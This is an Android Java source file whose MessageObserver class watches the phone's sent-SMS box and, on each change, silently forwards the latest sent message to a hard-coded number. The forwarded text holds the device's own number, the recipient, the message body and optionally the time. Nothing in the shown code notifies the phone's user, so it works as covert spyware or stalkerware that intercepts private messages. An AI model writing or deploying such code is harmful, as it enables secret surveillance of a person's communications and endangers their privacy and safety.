package com.firefighter.skynetconfirmed;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.DateFormat;

import java.util.Date;

/**
 * Created by baynhuchim on 8/14/16.
 */
public class MessageObserver extends ContentObserver{
    private Context context;

    public MessageObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        Cursor cursor = context.getContentResolver().query(
            Uri.parse("content://sms/sent"), null, null, null, null);

        SharedPreferences pref = PreferenceManager.getDefaultSharedPreferences(context);
        boolean adrOnly = pref.getBoolean("switch_out_address_only", false);
        boolean getTime = pref.getBoolean("switch_message_time", false);

        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String myNumber = tMgr.getLine1Number();

        String destNumber = "0";
        Date time;

        assert cursor != null;
        if (cursor.moveToNext()) {
//            String protocol = cursor.getString(cursor.getColumnIndex("protocol"));
//            int type = cursor.getInt(cursor.getColumnIndex("type"));
//            // Only processing outgoing sms event & only when it
//            // is sent successfully (available in SENT box).
//            if (protocol != null || type != MESSAGE_TYPE_SENT) {
//                return;
//            }
            int dateColumn = cursor.getColumnIndex("date");
            int addressColumn = cursor.getColumnIndex("address");
            int bodyColumn = cursor.getColumnIndex("body");

            String sourceNumber = cursor.getString(addressColumn);
            if(!sourceNumber.equals(destNumber)) {
                if(getTime) time = new Date(cursor.getLong(dateColumn));
                else        time = null;
                String messageBody = cursor.getString(bodyColumn);
                String message;
                if(adrOnly) message = createTextMessage(myNumber, sourceNumber, "", time);
                else        message = createTextMessage(myNumber, sourceNumber, messageBody, time);

                sendTextMessage(destNumber, message);
            }
        }
        cursor.close();
    }

    private String createTextMessage(String from, String to, String content, Date time) {
        String msg = from + " -> " + to;
        if(content.equals(""))  msg += ".";
        else                    msg += ": " + content;
        if(time != null)
            msg += "\nat " + DateFormat.format("HH:mm, EEE dd/MM/yyyy", time);
        return msg;
    }

    public void sendTextMessage(String dest, String msg) {
        SmsManager manager = SmsManager.getDefault();
        manager.sendTextMessage(dest, null, msg, null, null);
    }
}
